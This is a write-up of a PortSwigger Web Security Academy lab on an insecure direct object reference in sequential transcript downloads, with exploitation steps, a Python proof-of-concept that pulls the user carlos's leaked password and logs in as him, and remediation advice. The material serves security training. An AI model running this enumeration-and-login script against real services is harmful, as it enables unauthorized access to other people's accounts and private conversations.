# IDOR — Insecure Direct Object References via Downloadable Transcripts — Broken Access Control

**Platform:** PortSwigger Web Security Academy
**Category:** Access Control Vulnerabilities
**Date:** 2026-08-04

## The Problem

The application let users download their own live-chat support transcripts via a URL like `/download-transcript/1.txt`, where the number directly referenced a specific transcript file with no ownership check. Since the identifier was a simple, predictable sequential number, any user could increment or guess it to download other users' transcripts — a classic **Insecure Direct Object Reference (IDOR)**.

One of these transcripts happened to contain a support agent carelessly writing out another user's (`carlos`) password in plain text while helping them — turning a simple IDOR into a full account takeover.

## Discovery / Exploitation

1. Request `/download-transcript/1.txt` (or enumerate other small sequential numbers) without any prior authentication or ownership check
2. Read through the returned transcripts, searching for any sensitive information accidentally included in the conversation
3. Find a transcript where a support agent reveals `carlos`'s password while resolving an account issue
4. Extract the password from the transcript text
5. Log in as `carlos` using the leaked credentials, gaining full access to their account

## Impact

Any unauthenticated or low-privileged user can download arbitrary support transcripts belonging to other users, simply by changing a number in the URL. Beyond the direct privacy violation of reading someone else's support conversation, this specific case escalated to a complete account takeover because sensitive credentials were carelessly included in plain text within the leaked file.

## Proof of Concept (Python)

This script downloads a transcript file, extracts a leaked password from its contents using a regex, and then uses that password to log in as the affected user (`carlos`).

```python
import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}


def retrieve_carlos_password(s, url):
    chat_url = url + "/download-transcript/1.txt"
    r = s.get(chat_url, verify=False, proxies=proxies)
    res = r.text

    if "password" in res:
        print("(+) found carlos's password")
        carlos_password = re.findall(r'password is (.*)\.', res)
        return carlos_password[0]
    else:
        print("(-) could not find carlos's password")
        sys.exit(-1)


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf


def carlos_login(s, url, password):
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    print("(+) logging in as carlos user...")
    data_login = {"username": "carlos", "password": password, "csrf": csrf_token}
    r = s.post(login_url, data=data_login, proxies=proxies, verify=False)
    res = r.text

    if "logout" in res:
        print("(+) successfully logged in as carlos user")
    else:
        print("(-) could not log in as carlos user")


def main():
    if len(sys.argv) != 2:
        print("(+) usage: %s <url>" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    carlos_password = retrieve_carlos_password(s, url)

    print("(+) logging into carlos account")
    carlos_login(s, url, carlos_password)


if __name__ == "__main__":
    main()
```

**How it works:**
1. Requests `/download-transcript/1.txt` directly, with no login required beforehand
2. Searches the returned text for the word "password" and extracts the leaked value with a regex
3. Logs in as `carlos` using the leaked password, handling the CSRF token required for login
4. Confirms success by checking for "logout" in the login response

## Remediation

Two separate issues must be fixed:
1. **Fix the IDOR** — transcript downloads must be tied to the authenticated user's own session; the server should verify the requester actually owns that specific transcript before returning it, rather than trusting a sequential, guessable identifier in the URL
2. **Never transmit credentials in plain text through any channel**, including support chat — support agents should use secure, out-of-band methods (like a password reset link) instead of typing a password directly into a conversation that may later be stored or exported
